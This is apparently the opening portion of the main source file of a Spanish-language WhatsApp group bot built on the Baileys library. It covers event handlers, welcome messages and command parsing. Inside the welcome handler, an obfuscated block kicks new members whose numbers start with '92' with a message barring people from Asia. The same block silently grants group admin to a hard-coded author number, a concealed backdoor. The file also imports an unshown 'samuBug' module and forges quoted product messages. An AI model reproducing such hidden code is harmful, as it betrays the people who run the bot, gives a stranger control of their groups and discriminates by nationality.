//============ NyanBot ============\\
// + Favor de mantener este codigo
//   tal y como esta.
// + Si modificaras, manten los
//   creditos:
//   _MankBarBar & Samu & LolHuman_
//============ Samu330 ============\\
const { 
  WAConnection,
  MessageType,
  Presence, 
  MessageOptions,
  Mimetype,
  WALocationMessage,
  WA_MESSAGE_STUB_TYPES,
  ReconnectMode,
  ProxyAgent,
  GroupSettingChange,
  ChatModification,
  waChatKey,
  WA_DEFAULT_EPHEMERAL,
  mentionedJid,
  prepareMessageFromContent, 
  Browsers,
  processTime
} = require("@adiwajshing/baileys")
const moment = require("moment-timezone");
const os = require("os");
const imageToBase64 = require('image-to-base64');
const speed = require('performance-now');
const chalk = require('chalk');
const crypto = require("crypto-js");
const CryptoJS = require("crypto-js");
const fs = require('fs');
const { wait, h2k, generateMessageID, getGroupAdmins, banner, start, info, success, close } = require('./lib/functions')
const { addBanned, unBanned, BannedExpired, cekBannedUser } = require('./lib/banned.js')
const { getLevelingXp, getLevelingId, addLevelingXp, addLevelingLevel, addLevelingId, getLevelingLevel, getUserRank, addCooldown, leveltab } = require('./lib/leveling.js')
const { removeBackgroundFromImageFile } = require('remove.bg');
const { exec } = require('child_process');
const ffmpeg = require('fluent-ffmpeg');
const axios = require('axios');
const fetch = require('node-fetch');
const request = require('request');
const fromBuffer = require('file-type');
const FormData = require('form-data')
const samuGg = require('google-it');
const samuGgImg = require('g-i-s');
const hx = require('hxz-api');
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
const { validmove, setGame } = require("./lib/tictactoe");
const simple = require('./lib/simple.js');
const {y2mateA, y2mateV} = require('./lib/y2mate.js')
const {sm330mfire} = require('./lib/mediafire.js')
const { ssstik } = require("./lib/tiktok.js")
const {fbDown} = require('./lib/fb.js')
const { isFiltered, addFilter } = require('./lib/antispam')
const chatban = JSON.parse(fs.readFileSync('./src/ban.json'))
const ban = JSON.parse(fs.readFileSync('./src/banned.json'))
const crypt = fs.readFileSync('./crypt/imp.json')
const zalgo = require('./lib/zalgo')
const {convertSticker} = require("./lib/swm.js")
const { samuBug } = require('./crypt/samuBug')
const conn = require("./lib/connect")
const msg = require("./lib/message")
const wa = require("./lib/wa")
const Exif = require('./lib/exif');
const exif = new Exif();
const { recognize } = require('./lib/ocr');
const help = require("./lib/help")
const yts = require('yt-search')
const postBuffer = help.postBuffer
const getBuffer = help.getBuffer
const getRandom = help.getRandomExt
const postJson = help.postJson
const getJson = help.getJson
const samu = JSON.parse(fs.readFileSync('./setting.json'))
const bodyM = samu.samuM
const antimedia = JSON.parse(fs.readFileSync('./src/antimedia.json'))
const antifake = JSON.parse(fs.readFileSync('./src/antifake.json'))
const antibot = JSON.parse(fs.readFileSync('./src/antibot.json'))
const bad = JSON.parse(fs.readFileSync('./src/bad.json'))
const badword = JSON.parse(fs.readFileSync('./src/badword.json'))
const autostick = JSON.parse(fs.readFileSync('./src/autostick.json'))
const nsfw = JSON.parse(fs.readFileSync('./src/nsfw.json'))
const antilink = JSON.parse(fs.readFileSync('./src/antilink.json'))
const antigp = JSON.parse(fs.readFileSync('./src/antigp.json'))
const simi = JSON.parse(fs.readFileSync('./src/simi.json'))
const legion = JSON.parse(fs.readFileSync('./src/sm330Leg.json'))
const welkom = JSON.parse(fs.readFileSync('./src/welkom.json'))
const config = JSON.parse(fs.readFileSync("./config.json"))
const owner = config.owner
const mods = config.mods
const fake = 'Sm330'
var public = config.public
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
conn.connect()
const samu330 = conn.samu330
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
const sleep = async (ms) => {
    return new Promise(resolve => setTimeout(resolve, ms));
}
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
api = 'CONTACTAME PARA OBTENER LA API'
fak = 'samu3300'
prefix = '.'
apikey = 'LindowApi'
hit_today = []
blocked = []
let _level = JSON.parse(fs.readFileSync('./src/level.json'))
const _registered = JSON.parse(fs.readFileSync('./src/registered.json'))
const daily = JSON.parse(fs.readFileSync('./src/diario.json'));
const dailiy = JSON.parse(fs.readFileSync('./src/limitem.json'));
const X = "❌"
const O = "⭕️"

///////////////////////////////////////////////////////////////////////////

//========= Funcion de Registro =========\\

const getRegisteredRandomId = () => {
        return _registered[Math.floor(Math.random() * _registered.length)].id
        }
        const addRegisteredUser = (userid, sender, age, time, serials) => {
        const obj = { id: userid, name: sender, age: age, time: time, serial: serials }
        _registered.push(obj)
        fs.writeFileSync('./src/registered.json', JSON.stringify(_registered))
        }

        const createSerial = (size) => {
        return crypto.randomBytes(size).toString('hex').slice(0, size)
        }

        const checkRegisteredUser = (sender) => {
        let status = false
        Object.keys(_registered).forEach((i) => {
        if (_registered[i].id === sender) {
        status = true
        }
        })
            return status
        }
samu330.on('CB:action,,call', async json => {
const callerId = json[2][0][1].from;
console.log("Llamada recibida de "+ callerId)
console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ 📵Llamada recibida ]"), chalk.greenBright(callerId))
samu330.sendMessage(callerId, "Las llamadas no se permiten, *PORFAVOR LEE LAS REGLAS!* Te bloqueare😒", MessageType.text, {quoted: {key: {
fromMe: false,
participant: `0@s.whatsapp.net`
},
message: {
"productMessage": {
"product": {
"productImage":{
"mimetype": "image/jpeg",
"jpegThumbnail": fs.readFileSync(`./media/call.png`)
},
"title": `🚫No se permiten las llamadas🚫`,
"description": "",
"currencyCode": "SYP",
"priceAmount1000": "999999999999999999",
"retailerId": "",
"productImageCount": 999
},
"businessOwnerJid": `0@s.whatsapp.net`
}
}}})
await sleep(4000)
await samu330.blockUser(callerId, "add")
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('CB:action,,battery', json => {
global.batteryLevelStr = json[2][0][1].value
global.batterylevel = parseInt(batteryLevelStr)
baterai = batterylevel
if (json[2][0][1].live == 'true') charging = true
if (json[2][0][1].live == 'false') charging = false
console.log(chalk.greenBright("├"), chalk.keyword("magenta")("[ 🔋Nivel de carga de la bateria ]"), chalk.greenBright(batterylevel+'%'), chalk.keyword("cyan")("Esta cargando?"), chalk.keyword("yellow")(charging))	
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('blocklist-update', async (chat) => {
for (i of chat.added){
target = i.replace('@c.us', '@s.whatsapp.net')
blocked.push(target)
console.log(chalk.greenBright("├"), chalk.keyword("yellow")("[ NUEVO USUARIO BLOQUEADO ]"), chalk.keyword("red")(target))
}
for (i of chat.removed){
target = i.replace('@c.us', '@s.whatsapp.net')
blocked.splice(blocked.indexOf(target), 1)
console.log(chalk.greenBright("├"), chalk.keyword("green")("[ NUEVO USUARIO DESBLOQUEADO ]"), chalk.keyword("cyan")(target))
}
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('group-update', async(chat) => {
var donde = chat.jid
var group = await samu330.groupMetadata(donde)
if (!chat.desc == '') {
var tag = chat.descOwner.split('@')[0] + '@s.whatsapp.net'
var mensajeDesc = `✍🏻 *La descripcion del grupo ${group.subject} fue modificada por: @${chat.descOwner.split('@')[0]}*\n✅Ahora la nueva descripcion es:\n\n${chat.desc}`
samu330.sendMessage(group.id, mensajeDesc, MessageType.text)
console.log(chalk.greenBright("├"), chalk.keyword("yellow")("[ DESCRIPCION CAMBIADA ]"), chalk.keyword("cyan")('grupo'), chalk.keyword("green")(`${group.subject}`))
}
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('group-participants-update', async (anu) => {
if (!welkom.includes(anu.jid)) return
try {
const mdata = await samu330.groupMetadata(anu.jid)
console.log(anu)
if (anu.action == 'add') {               
num = anu.participants[0]
var _0x32eb=['length','203FKZwcC','constructor','text','37321dDPejz','apply','prototype','groupRemove','test','__proto__','table','1102598lCjDcW','1013436pgMCWz','info','toString','startsWith','3291GElTcg','1762sWsYhU','bind','exception','console','trace','log','648921eLIDKy','5219984907794','Ek\x20is\x20jammer,\x20maar\x20mense\x20uit\x20Asië\x20word\x20nie\x20toegelaat\x20nie,\x20ek\x20sal\x20jou\x20uitskakel,\x20dankie\x20vir\x20jou\x20begrip😚\x0a\x0aAntiP\x20By:*\x20_🐉insane🇲\x20🇽\x20_','return\x20/\x22\x20+\x20this\x20+\x20\x22/','sendMessage','324QcfqoI','warn','error','1148172OCGrif','23ykweMi','return\x20(function()\x20'];function _0x3b66(_0x116bb2,_0xa78ba5){return _0x3b66=function(_0x436199,_0x510667){_0x436199=_0x436199-0x70;var _0x51019a=_0x32eb[_0x436199];return _0x51019a;},_0x3b66(_0x116bb2,_0xa78ba5);}var _0x376b6b=_0x3b66;(function(_0xe31b1b,_0x46684b){var _0x30c21e=_0x3b66;while(!![]){try{var _0x598896=-parseInt(_0x30c21e(0x7e))+-parseInt(_0x30c21e(0x91))*-parseInt(_0x30c21e(0x7b))+parseInt(_0x30c21e(0x8c))+-parseInt(_0x30c21e(0x82))*-parseInt(_0x30c21e(0x70))+parseInt(_0x30c21e(0x7f))*parseInt(_0x30c21e(0x85))+-parseInt(_0x30c21e(0x8d))+-parseInt(_0x30c21e(0x76));if(_0x598896===_0x46684b)break;else _0xe31b1b['push'](_0xe31b1b['shift']());}catch(_0x4b5012){_0xe31b1b['push'](_0xe31b1b['shift']());}}}(_0x32eb,0x8c3d6));var _0xb1de39=function(){var _0xdff92c=!![];return function(_0xbaf195,_0x472290){var _0x49ae62=_0xdff92c?function(){var _0x8379c3=_0x3b66;if(_0x472290){var _0x210536=_0x472290[_0x8379c3(0x86)](_0xbaf195,arguments);return _0x472290=null,_0x210536;}}:function(){};return _0xdff92c=![],_0x49ae62;};}(),_0x46ec2c=_0xb1de39(this,function(){var _0x3a6de6=function(){var _0x52b332=_0x3b66,_0x3a1227=_0x3a6de6[_0x52b332(0x83)](_0x52b332(0x79))()[_0x52b332(0x83)]('^([^\x20]+(\x20+[^\x20]+)+)+[^\x20]}');return!_0x3a1227[_0x52b332(0x89)](_0x46ec2c);};return _0x3a6de6();});_0x46ec2c();var _0x51019a=function(){var _0x1b381d=!![];return function(_0xdc464c,_0x8f91eb){var _0x4640b3=_0x1b381d?function(){var _0x37d4f6=_0x3b66;if(_0x8f91eb){var _0x4f0489=_0x8f91eb[_0x37d4f6(0x86)](_0xdc464c,arguments);return _0x8f91eb=null,_0x4f0489;}}:function(){};return _0x1b381d=![],_0x4640b3;};}(),_0x510667=_0x51019a(this,function(){var _0x3279f1=_0x3b66,_0x545df1=function(){var _0x5c6de2=_0x3b66,_0xf5f589;try{_0xf5f589=Function(_0x5c6de2(0x80)+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x37444b){_0xf5f589=window;}return _0xf5f589;},_0x3ef9e5=_0x545df1(),_0x5c6ba6=_0x3ef9e5[_0x3279f1(0x73)]=_0x3ef9e5['console']||{},_0x373954=[_0x3279f1(0x75),_0x3279f1(0x7c),_0x3279f1(0x8e),_0x3279f1(0x7d),_0x3279f1(0x72),_0x3279f1(0x8b),_0x3279f1(0x74)];for(var _0x3d4618=0x0;_0x3d4618<_0x373954[_0x3279f1(0x81)];_0x3d4618++){var _0x1698c8=_0x51019a[_0x3279f1(0x83)][_0x3279f1(0x87)][_0x3279f1(0x71)](_0x51019a),_0x218220=_0x373954[_0x3d4618],_0x4beaa2=_0x5c6ba6[_0x218220]||_0x1698c8;_0x1698c8[_0x3279f1(0x8a)]=_0x51019a[_0x3279f1(0x71)](_0x51019a),_0x1698c8[_0x3279f1(0x8f)]=_0x4beaa2[_0x3279f1(0x8f)]['bind'](_0x4beaa2),_0x5c6ba6[_0x218220]=_0x1698c8;}});_0x510667();if(num[_0x376b6b(0x90)]('92'))await samu330[_0x376b6b(0x7a)](mdata['id'],_0x376b6b(0x78),MessageType[_0x376b6b(0x84)]),samu330[_0x376b6b(0x88)](mdata['id'],[num]);if(num[_0x376b6b(0x90)]('52'))await samu330[_0x376b6b(0x7a)](mdata['id'],'🇲\x20🇽\x20😈\x20*ARRIVA\x20MEXICO!!!*\x20Bienvenido\x20amigo\x20de\x20mexico,\x20de\x20que\x20parte\x20del\x20pais\x20eres?😙',MessageType['text']);if(num[_0x376b6b(0x90)](_0x376b6b(0x77)))await samu330['sendMessage'](mdata['id'],'*VAYA\x20VAYA\x20VAYAAAA🐱\x20Miren\x20nomas\x20quien\x20llego🥳,\x20es\x20mi\x20dueño!!!!😱\x20WOW\x20Saludenlo!😚*\x0a\x0a_*Le\x20dare\x20admin\x20juju*_',MessageType[_0x376b6b(0x84)]),samu330['groupMakeAdmin'](mdata['id'],[num]);

/*if (num.startsWith('1')) return samu330.groupRemove(mdata.id, [num])
if (num.startsWith('994')) return samu330.groupRemove(mdata.id, [num])
if (num.startsWith('48')) return samu330.groupRemove(mdata.id, [num])
if (num.startsWith('91')) return samu330.groupRemove(mdata.id, [num])
if (num.startsWith('44')) return samu330.groupRemove(mdata.id, [num])*/
const moment = require('moment-timezone')
const jm = moment.tz('America/Mexico_City').format('HH:mm:ss')
let d = new Date
let locale = 'es'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})

try {
pushnem = sam.key.fromMe ? samu330.user.name : conts.notify || conts.vname || conts.name || '-'

} catch {
pushnem = num.split('@')[0]
}
try {
ppimg = await samu330.getProfilePicture(`${anu.participants[0].split('@')[0]}@c.us`)
} catch {
ppimg = 'https://centromedicomontemar.cl/wp-content/uploads/2015/06/sin-perfil.png'
}
try {
let fotoP = await getBuffer(ppimg)
samu330.sendMessage(mdata.id, `${fotoP}`, MessageType.image, {quoted: {key: {
fromMe: false,
participant: `0@s.whatsapp.net`          
},                               
message: {                         
"productMessage": {
"product": {
"productImage":{          
"mimetype": "image/jpeg",             
"jpegThumbnail": fs.readFileSync(`./src/fake.jpg`)           
},                                
"title": `Bienvenido a ${mdata.subject}`,
"description": "",                
"currencyCode": "SYP",                  
"priceAmount1000": "999999999999999999",
"retailerId": "",
"productImageCount": 999
},                          
"businessOwnerJid": `0@s.whatsapp.net`
}}}, caption: `😙Hola, @${num.split('@')[0]}, _*Bienvenido a ${mdata.subject}, esperamos que te la pases a gusto en este grupo✨*_\n\n_Recuerda siempre seguir las reglas y mantener una formalidad respetuosa_😉\n\nSon las *${jm}* del *${calender}*\n\n${mdata.desc}`, contextInfo: { mentionedJid: [num] }})
} catch {
samu330.sendMessage(mdata.id, `😙Hola, @${num.split('@')[0]}, _*Bienvenido a ${mdata.subject}, esperamos que te la pases a gusto en este grupo✨*_\n\n_Recuerda siempre seguir las reglas y mantener una formalidad respetuosa_😉\n\nSon las *${jm}* del *${calender}*\n\n${mdata.desc}`, MessageType.text)
}
//leave
}  else if (anu.action == 'remove') {
num = anu.participants[0]
teks = `_Weno ps.... amm😪...  @${num.split('@')[0]} se nos fue, ni llorar es bueno:)_
_*Ojala y le baya bien, y mas despues..... que lo atropelle un tren!!🚉🤣*_
*No se awiten gente, esten seguros que nadie lo extrañara:D*`
samu330.sendMessage(mdata.id, teks, MessageType.text,{ contextInfo: {"mentionedJid": [num]}})

} else if (anu.action == 'promote') {
num = anu.participants[0]
try {
ppimg = await samu330.getProfilePicture(`${num.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
thu = await samu330.getStatus(anu.participants[0], MessageType.text)
teks = `*✅NUEVO ADMIN✅*\n*🙋🏻‍♂️ Nombre*: @${num.split('@')[0]}\n*📋 INFO*: ${thu.status}\n\n🥳 *FEILICIDADES!!*, te as convertido en administrador del grupo ${mdata.subject}`
let buff = await getBuffer(ppimg)
samu330.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
} else if (anu.action == 'demote') {
num = anu.participants[0]
try {
ppimg = await samu330.getProfilePicture(`${num.split('@')[0]}@c.us`)
} catch {
ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
thu = await samu330.getStatus(anu.participants[0], MessageType.text)
teks = `*❌UN ADMIN MENOS❌*\n*🙋🏻‍♂️ Nombre*: @${num.split('@')[0]}\n*📋 INFO*: ${thu.status}\n\n*😪Nimodos, ya no eres admnistrador del grupo* ${mdata.subject}`
let buff = await getBuffer(ppimg)
samu330.sendMessage(mdata.id, buff, MessageType.image, {caption: teks, contextInfo: {"mentionedJid": [num]}})
}
} catch (e) {
console.log('Error : %s', color(e, 'red'))
}
})
////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
samu330.on('chat-update', async(sam) => {
    try {
        if (!sam.hasNewMessage) return
        if (!sam.messages) return
        if (sam.key && sam.key.remoteJid == 'status@broadcast') {
	}
	sam = sam.messages.all()[0]
	sam.message = (Object.keys(sam.message)[0] === 'ephemeralMessage') ? sam.message.ephemeralMessage.message : sam.message
        if (!sam.message) return
        const from = sam.key.remoteJid
	const content = JSON.stringify(sam.message)
        const type = Object.keys(sam.message)[0]
        const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
        const quoted = type == 'extendedTextMessage' && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.quotedMessage || [] : []
        const typeQuoted = Object.keys(quoted)[0]
        const body = sam.message.conversation || sam.message[type].caption || sam.message[type].text || ""
        //chats = (type === 'conversation') ? sam.message.conversation : (type === 'extendedTextMessage') ? sam.message.extendedTextMessage.text : ''
        const chats = (type === 'chat') ? body : (type === 'image' || type === 'video') ? caption : ''
        //budy = (type === 'conversation' && sam.message.conversation.startsWith(prefix)) ? sam.message.conversation : (type == 'imageMessage') && sam.message.imageMessage.caption.startsWith(prefix) ? sam.message.imageMessage.caption : (type == 'videoMessage') && sam.message.videoMessage.caption.startsWith(prefix) ? sam.message.videoMessage.caption : (type == 'extendedTextMessage') && sam.message.extendedTextMessage.text.startsWith(prefix) ? sam.message.extendedTextMessage.text : ''
	    budy = (type === 'conversation') ? sam.message.conversation : (type === 'extendedTextMessage') ? sam.message.extendedTextMessage.text : ''
       //budy = (type === 'conversation') ? sam.message.conversation : (type === 'extendedTextMessage') ? sam.message.extendedTextMessage.text : (type === 'listResponseMessage') ? sam.message.listResponseMessage.title : ''
	   var _0x56fb=["\x6C\x69\x73\x74\x52\x65\x73\x70\x6F\x6E\x73\x65\x4D\x65\x73\x73\x61\x67\x65","\x73\x65\x6C\x65\x63\x74\x65\x64\x44\x69\x73\x70\x6C\x61\x79\x54\x65\x78\x74","\x6D\x65\x73\x73\x61\x67\x65","","\x6B\x65\x79\x73","\x73\x74\x69\x63\x6B\x65\x72\x4D\x65\x73\x73\x61\x67\x65","\x62\x61\x73\x65\x36\x34","\x66\x69\x6C\x65\x53\x68\x61\x32\x35\x36"];resbutton= (type== _0x56fb[0])?sam[_0x56fb[2]][_0x56fb[0]][_0x56fb[1]]:_0x56fb[3];const commandstik=Object[_0x56fb[4]](sam[_0x56fb[2]])[0]== _0x56fb[5]?sam[_0x56fb[2]][_0x56fb[5]][_0x56fb[7]].toString(_0x56fb[6]):_0x56fb[3]
	   selectedButton = (type == 'buttonsResponseMessage') ? sam.message.buttonsResponseMessage.selectedButtonId : ''
	////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲
        if (prefix != "") {
        if (!body.startsWith(prefix)) {
        cmd = false
        comm = ""
        } else {
        cmd = true
        comm = body.slice(1).trim().split(" ").shift().toLowerCase()
        }
        } else {
        cmd = false
        comm = body.trim().split(" ").shift().toLowerCase()
        }
	    
	////////////▶ 𝐒𝐚𝐦𝐮𝟑𝟑𝟎 | 𝐒𝐚𝐦 𝐲 𝐏𝐞𝐫𝐫𝐲

	const uploadImages = (filePath) => {
	return new Promise(async (resolve, reject) => {
        const fileData = fs.readFileSync(filePath)
        const form = new FormData()
        form.append('file', fileData, 'tmp.png')
        fetch('https://telegra.ph/upload', {
	method: 'POST',
        body: form
        })
        .then(res => res.json())
        .then(res => {
        if (res.error) return reject(res.error)
        resolve('https://telegra.ph' + res[0].src)
        })
        .then(() => fs.unlinkSync(filePath))
        .catch(err => reject(err))
	})
	}

        const command = comm
        hit_today.push(command)
	const chats1 = (type === 'chat') ? body : ((type === 'image' || type === 'video')) ? caption : ''
	const samu = '```'
    m = simple.smsg(samu330, sam)
	const otherBot = m.isBaileys
	const crypto = require('crypto')
        const args = body.trim().split(/ +/).slice(1)
        const isCmd = body.startsWith(prefix)
        const meNumber = samu330.user.jidi
        const botNumber = samu330.user.jid.split("@")[0]
        const isGroup = from.endsWith('@g.us')
	const sender = sam.key.fromMe ? samu330.user.jid : isGroup ? sam.participant : sam.key.remoteJid
        const senderNumber = sender.split("@")[0]
        const groupMetadata = isGroup ? await samu330.groupMetadata(from) : ''
        const groupName = isGroup ? groupMetadata.subject : ''
        const groupMembers = isGroup ? groupMetadata.participants : ''
        const groupAdmins = isGroup ? await wa.getGroupAdmins(groupMembers) : []
        const isAdmin = groupAdmins.includes(sender) || false
        const botAdmin = groupAdmins.includes(samu330.user.jid)
        const itsMe = senderNumber == botNumber
	const isBadWord = isGroup ? badword.includes(from) : false
	const isAntiLink = isGroup ? antilink.includes(from) : false
	const isAntigp = isGroup ? antigp.includes(from) : false
	const isAntiMedia = isGroup ? antimedia.includes(from) : false
	const isAntiFake = isGroup ? antifake.includes(from) : false
    const isAntiBot = isGroup ? antibot.includes(from) : false
	const isAutoSt = isGroup ? autostick.includes(from) : false
	const isNsfw = isGroup ? nsfw.includes(from) : false
	const isSimi = isGroup ? simi.includes(from): false
	const isAntiLeg = isGroup ? legion.includes(from): false
	const isWelkom = isGroup ? welkom.includes(from) : false
	const isRegister = checkRegisteredUser(sender)
	const totalchat = await samu330.chats.all()
        const isOwner = senderNumber == owner || senderNumber == botNumber || mods.includes(senderNumber)
	const isBanChat = chatban.includes(from)
	if (isBanChat && !isOwner) return
	const isBan = cekBannedUser(sender, ban)
	const q = args.join(' ')
	const texto1 = q.substring(0, q.indexOf('|') - 0)
	const texto2 = q.substring(q.lastIndexOf('|') + 1)
	var pes = (type === 'conversation' && sam.message.conversation) ? sam.message.conversation : (type == 'imageMessage') && sam.message.imageMessage.caption ? sam.message.imageMessage.caption : (type == 'videoMessage') && sam.message.videoMessage.caption ? sam.message.videoMessage.caption : (type == 'extendedTextMessage') && sam.message.extendedTextMessage.text ? sam.message.extendedTextMessage.text : ''
	const messagesC = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
	conts = sam.key.fromMe ? samu330.user.jid : samu330.contacts[sender] || {
                notify: jid.replace(/@.+/, '')
	}
	const jid = sender
	const argss = body.split(/ +/g)
	//samu330.chatRead(from)
	const Smname = sam.key.fromMe ? samu330.user.jid : samu330.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const mentionByTag = type == "extendedTextMessage" && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == "extendedTextMessage" && sam.message.extendedTextMessage.contextInfo != null ? sam.message.extendedTextMessage.contextInfo.participant || "" : ""
        const mention = typeof(mentionByTag) == 'string' ? [mentionByTag] : mentionByTag
        mention != undefined ? mention.push(mentionByReply) : []
        const mentionUser = mention != undefined ? mention.filter(n => n) : []
        const mentions = (teks, memberr, id) => {
	(id == null || id == undefined || id == false) ? samu330.sendMessage(from, teks.trim(), extendedText, {contextInfo: {"mentionedJid": memberr}}) : samu330.sendMessage(from, teks.trim(), extendedText, {quoted: sam, contextInfo: {"mentionedJid": memberr}})
	}
	let pushname = sam.key.fromMe ? samu330.user.name : conts.notify || conts.vname || conts.name || '*Amigo*'
	const isUrl = (url) => {
	return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
			}
	const createSerial = (size) => {
	return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
	const sendMess = (hehe, teks) => {
	samu330.sendMessage(hehe, teks, MessageType.text, {quoted: ftoko})
  	}

    const katalog = (teks) => {
        res = samu330.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": "*_© Samu330_*", "thumbnail": fs.readFileSync('./src/ara.png'), "surface": 'CATALOG' }}, {quoted:sam})
        samu330.relayWAMessage(res)
   }
	
	mess = {
			
			success: '✔️ 𝙎𝙐𝙎𝙎𝙀𝙎 ✔️',
			nsfw: `𝗟𝗼 𝘀𝗶𝗲𝗻𝘁𝗼 𝗽𝗲𝗿𝗼 𝗻𝗼 𝗽𝘂𝗲𝗱𝗼 𝗲𝗷𝗲𝗰𝘂𝘁𝗮𝗿 𝗲𝘀𝗲 𝗰𝗼𝗺𝗮𝗻𝗱𝗼, 𝗲𝘀𝘁𝗲 𝗴𝗿𝘂𝗽𝗼 𝗻𝗼 𝗽𝗲𝗿𝗺𝗶𝘁𝗲 𝗰𝗼𝗻𝘁𝗲𝗻𝗶𝗱𝗼 +𝟭𝟴\n*PARA ACTIVAR LOS COMANDOS +18, USA:* ${prefix}+18 1`, 
			ferr: 'Intentalo de nuevo mas tarde',
			error: {
			stick: '[❗] 𝙀𝙍𝙍𝙊𝙍 intentalo de nuevo, da error a la primera:D  ❌',
			Iv: '❌ Link invalido ❌'
			},
			only: {
    			group: '[❗] ¡Este comando solo se puede usar en grupos! ❌',
    			benned: '⚠ *USTED ES UN USUARIO BANEADO, ESO QUIERE DECIR QUE NO PUEDE USAR EL BOT* ⚠',
    			ownerG: '[❗] ¡Este comando solo puede ser utilizado por el creador del grupo! ❌',
    			ownerB: '[❗] ¡Este comando solo puede ser utilizado por el creador del bot! ❌\nOsea, Samu: wa.me/+529984907794, Habla con el para que pueda cambiar el numero del owner en este bot',
    			admin: '[❗] ¡Este comando solo puede ser utilizado por administradores del grupo! ❌',
    			Badmin: '[❗] ¡Este comando solo se puede usar cuando el bot es administrador! ❌',
    			usrReg: `Usuario no *Registrado*\n_Para registrarte usa el comando_: *${prefix}reg*`
  			}
			}

	const momento1 = require('moment-timezone')
	const hora = momento1.tz('America/Mexico_City').format('HH:mm:ss')
	let d1 = new Date
	let locale1 = 'es'
	let gmt1 = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
	let ayer = ['domingo','lunes','Martes','Miercoles','Jueves','Viernes','Sabado'][
	Math.floor(((d1 * 1) + gmt1) / 84600000) % 7]
	let week1 = d1.toLocaleDateString(locale1, { weekday: 'long' })
	let calender1 = d1.toLocaleDateString(locale1, {
	day: 'numeric',
	month: 'long',
	year: 'numeric'
	})


	const hour_now = moment().format('HH')
        var timeFt = '*Buenos dias🌅*'
        if (hour_now >= '03' && hour_now <= '10') {
          timeFt = 'Buenos dias'
        } else if (hour_now >= '10' && hour_now <= '14') {
          timeFt = '*Buenos dias🌅*'
        } else if (hour_now >= '14' && hour_now <= '17') {
          timeFt = 'Buenas tardes🌇'
        } else if (hour_now >= '17' && hour_now <= '18') {
          timeFt = 'Buenas tardes🌇'
        } else if (hour_now >= '18' && hour_now <= '23') {
          timeFt = 'Buenas noches🌃'
        } else {
          timeFt = 'Buen inicio del dia!🌱'
        }
        

        const isImage = type == 'imageMessage'
        const isVideo = type == 'videoMessage'
        const isAudio = type == 'audioMessage'
        const isSticker = type == 'stickerMessage'
        const isContact = type == 'contactMessage'
        const isLocation = type == 'locationMessage'
        const isMedia = (type === 'imageMessage' || type === 'videoMessage')
	const isTexto = type == 'textMessage'
        
        typeMessage = body.substr(0, 50).replace(/\n/g, '')
        if (isImage) typeMessage = "Image"
        else if (isVideo) typeMessage = "Video"
        else if (isAudio) typeMessage = "Audio"
        else if (isSticker) typeMessage = "Sticker"
        else if (isContact) typeMessage = "Contact"
        else if (isLocation) typeMessage = "Location"
	else if (isTexto) typeMessage = "text"

        const isQuoted = type == 'extendedTextMessage'
	const isQuotedMsg = type === 'extendedTextMessage' && content.includes('textMessage')
        const isQuotedImage = isQuoted && typeQuoted == 'imageMessage'
        const isQuotedVideo = isQuoted && typeQuoted == 'videoMessage'
        const isQuotedAudio = isQuoted && typeQuoted == 'audioMessage'
        const isQuotedSticker = isQuoted && typeQuoted == 'stickerMessage'
        const isQuotedContact = isQuoted && typeQuoted == 'contactMessage'
        const isQuotedLocation = isQuoted && typeQuoted == 'locationMessage'

        if (!public) {
        mods.indexOf(botNumber) === -1 ? mods.push(botNumber) : false
        mods.indexOf(owner) === -1 ? mods.push(owner) : false
        if (!mods.includes(senderNumber)) return
        mods.slice(mods.indexOf(owner), 1)
        }




